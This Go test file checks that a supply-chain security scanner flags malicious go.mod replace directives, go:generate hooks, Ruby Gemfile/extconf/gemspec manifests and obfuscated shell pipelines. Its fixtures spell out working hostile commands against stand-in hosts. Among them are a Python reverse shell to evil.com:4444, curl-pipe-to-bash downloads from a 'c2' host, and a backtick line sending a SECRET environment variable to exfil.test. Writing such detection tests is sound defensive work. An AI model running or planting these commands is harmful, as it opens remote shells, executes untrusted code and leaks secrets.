package vet

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

func TestExtended_GoModSuspiciousReplace(t *testing.T) {
	tempDir := t.TempDir()

	// 1. go.mod with sensitive absolute paths, path traversal, remote URLs, and obfuscated paths
	goModContent := `module example.com/testmod

go 1.21

require (
	golang.org/x/crypto v0.14.0
)

replace (
	golang.org/x/crypto => /etc/shadow
	example.com/sensitive => /root/.ssh/id_rsa
	example.com/traversal => ../../../../../var/log
	example.com/remote => http://evil.attacker.com/payload
	example.com/obfuscated => ./%2e%2e/escaped
	example.com/valid => ./pkg/valid
)
`
	if err := os.WriteFile(filepath.Join(tempDir, "go.mod"), []byte(goModContent), 0644); err != nil {
		t.Fatalf("Failed to write go.mod: %v", err)
	}

	engine := NewEngine(Config{StrictMode: true})
	report, err := engine.Inspect(context.Background(), []string{"go", "build", "./..."}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskCritical && report.MaxRisk != RiskHigh {
		t.Errorf("Expected High/Critical risk for malicious go.mod replace directives, got: %s", report.MaxRisk)
	}
	if !report.BlockExecution {
		t.Errorf("Expected BlockExecution=true for suspicious go.mod replace directives")
	}

	foundCount := 0
	for _, f := range report.Findings {
		if f.RuleID == "ARGUS-GO-01" {
			foundCount++
		}
	}
	if foundCount < 5 {
		t.Errorf("Expected at least 5 ARGUS-GO-01 findings, got %d: %+v", foundCount, report.Findings)
	}
}

func TestExtended_GoGenerateShellInjection(t *testing.T) {
	tempDir := t.TempDir()

	// 1. Malicious Go source files with dangerous go:generate directives
	goFileContent := `package main

//go:generate curl -s http://evil.com/backdoor.sh -o /tmp/backdoor.sh
//go:generate bash -c "chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh"
//go:generate python3 -c "import socket,os,pty;s=socket.socket();s.connect(('evil.com',4444));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')"
//go:generate stringer -type=Status

func main() {}
`
	if err := os.WriteFile(filepath.Join(tempDir, "main.go"), []byte(goFileContent), 0644); err != nil {
		t.Fatalf("Failed to write main.go: %v", err)
	}

	engine := NewEngine(Config{StrictMode: true})
	report, err := engine.Inspect(context.Background(), []string{"go", "generate", "./..."}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskCritical {
		t.Errorf("Expected RiskCritical for malicious go:generate directives, got: %s", report.MaxRisk)
	}
	if !report.BlockExecution {
		t.Errorf("Expected BlockExecution=true for malicious go:generate directives")
	}

	foundCount := 0
	for _, f := range report.Findings {
		if f.RuleID == "ARGUS-GO-02" {
			foundCount++
		}
	}
	if foundCount < 3 {
		t.Errorf("Expected at least 3 ARGUS-GO-02 findings, got %d: %+v", foundCount, report.Findings)
	}
}

func TestExtended_RubyEcosystemInspection(t *testing.T) {
	tempDir := t.TempDir()

	// 1. Gemfile with socket connections and open-uri network fetches
	gemfileContent := `source "https://rubygems.org"
require "open-uri"

sock = TCPSocket.new("evil.attacker.com", 4444)
sock.puts "pwned"

gem "rails", "7.0.0"
`
	if err := os.WriteFile(filepath.Join(tempDir, "Gemfile"), []byte(gemfileContent), 0644); err != nil {
		t.Fatalf("Failed to write Gemfile: %v", err)
	}

	// 2. extconf.rb with shell execution and Net::HTTP download
	extconfContent := `require 'mkmf'
require 'net/http'

Net::HTTP.get(URI('http://c2.evil.com/payload'))
system("curl -s http://c2.evil.com/stage2 | bash")
exec("whoami")
`
	if err := os.WriteFile(filepath.Join(tempDir, "extconf.rb"), []byte(extconfContent), 0644); err != nil {
		t.Fatalf("Failed to write extconf.rb: %v", err)
	}

	// 3. gemspec with backticks shell execution
	gemspecContent := `Gem::Specification.new do |spec|
  spec.name        = "malicious-gem"
  spec.version     = "0.1.0"
  spec.summary     = "test"
  ` + "`curl -s https://exfil.test?env=` + ENV['SECRET']" + `
  spec.files       = ["lib/malicious.rb"]
end
`
	if err := os.WriteFile(filepath.Join(tempDir, "malicious.gemspec"), []byte(gemspecContent), 0644); err != nil {
		t.Fatalf("Failed to write gemspec: %v", err)
	}

	engine := NewEngine(Config{StrictMode: true})
	report, err := engine.Inspect(context.Background(), []string{"bundle", "install"}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskCritical && report.MaxRisk != RiskHigh {
		t.Errorf("Expected RiskHigh/Critical for malicious Ruby ecosystem manifests, got: %s", report.MaxRisk)
	}
	if !report.BlockExecution {
		t.Errorf("Expected BlockExecution=true for malicious Ruby manifests")
	}

	var foundRB01, foundRB02, foundRB03 bool
	for _, f := range report.Findings {
		if f.RuleID == "ARGUS-RB-01" {
			foundRB01 = true
		}
		if f.RuleID == "ARGUS-RB-02" {
			foundRB02 = true
		}
		if f.RuleID == "ARGUS-RB-03" {
			foundRB03 = true
		}
	}

	if !foundRB01 || !foundRB02 || !foundRB03 {
		t.Errorf("Missing expected Ruby findings (rb01=%v, rb02=%v, rb03=%v): %+v", foundRB01, foundRB02, foundRB03, report.Findings)
	}
}

func TestExtended_ObfuscatedShellPipelines(t *testing.T) {
	engine := NewEngine(Config{StrictMode: true})

	testCases := []struct {
		name         string
		cmdArgs      []string
		expectedRule string
	}{
		{
			name:         "base64 -d | sh",
			cmdArgs:      []string{"sh", "-c", "echo aGVsbG8= | base64 -d | sh"},
			expectedRule: "ARGUS-SHELL-01",
		},
		{
			name:         "base64 -D | bash (macOS)",
			cmdArgs:      []string{"bash", "-c", "echo aGVsbG8= | base64 -D | bash"},
			expectedRule: "ARGUS-SHELL-01",
		},
		{
			name:         "echo ... | sh",
			cmdArgs:      []string{"sh", "-c", "echo 'curl evil.com | sh' | sh"},
			expectedRule: "ARGUS-SHELL-02",
		},
		{
			name:         "wget -O- ... | sh",
			cmdArgs:      []string{"sh", "-c", "wget -O- http://evil.com/setup.sh | sh"},
			expectedRule: "ARGUS-SHELL-03",
		},
		{
			name:         "wget -qO- ... | bash",
			cmdArgs:      []string{"bash", "-c", "wget -qO- http://evil.com/setup.sh | bash"},
			expectedRule: "ARGUS-SHELL-03",
		},
		{
			name:         "curl ... | python3",
			cmdArgs:      []string{"sh", "-c", "curl -s http://evil.com/script.py | python3"},
			expectedRule: "ARGUS-SHELL-04",
		},
		{
			name:         "powershell -enc",
			cmdArgs:      []string{"powershell", "-enc", "JABhID0gMSsw"},
			expectedRule: "ARGUS-SHELL-05",
		},
		{
			name:         "powershell -EncodedCommand",
			cmdArgs:      []string{"powershell", "-EncodedCommand", "JABhID0gMSsw"},
			expectedRule: "ARGUS-SHELL-05",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			report, err := engine.Inspect(context.Background(), tc.cmdArgs, "")
			if err != nil {
				t.Fatalf("Inspect failed: %v", err)
			}
			if report.MaxRisk != RiskCritical {
				t.Errorf("Expected RiskCritical for %s, got: %s", tc.name, report.MaxRisk)
			}
			if !report.BlockExecution {
				t.Errorf("Expected BlockExecution=true for %s", tc.name)
			}

			found := false
			for _, f := range report.Findings {
				if f.RuleID == tc.expectedRule {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Expected rule %s in findings, got: %+v", tc.expectedRule, report.Findings)
			}
		})
	}
}

func TestExtended_BenignProjectsPass(t *testing.T) {
	tempDir := t.TempDir()

	// Benign go.mod
	goMod := `module example.com/benign
go 1.21
require github.com/stretchr/testify v1.8.4
replace example.com/sub => ./internal/sub
`
	_ = os.WriteFile(filepath.Join(tempDir, "go.mod"), []byte(goMod), 0644)

	// Benign Go file
	goCode := `package main
//go:generate stringer -type=Pill
func main() {}
`
	_ = os.WriteFile(filepath.Join(tempDir, "main.go"), []byte(goCode), 0644)

	// Benign Gemfile
	gemfile := `source "https://rubygems.org"
gem "rake", "~> 13.0"
`
	_ = os.WriteFile(filepath.Join(tempDir, "Gemfile"), []byte(gemfile), 0644)

	engine := NewEngine(Config{StrictMode: true})
	report, err := engine.Inspect(context.Background(), []string{"go", "build"}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskNone || report.BlockExecution {
		t.Errorf("Expected benign project to pass with RiskNone and no block, got: %+v", report)
	}
}
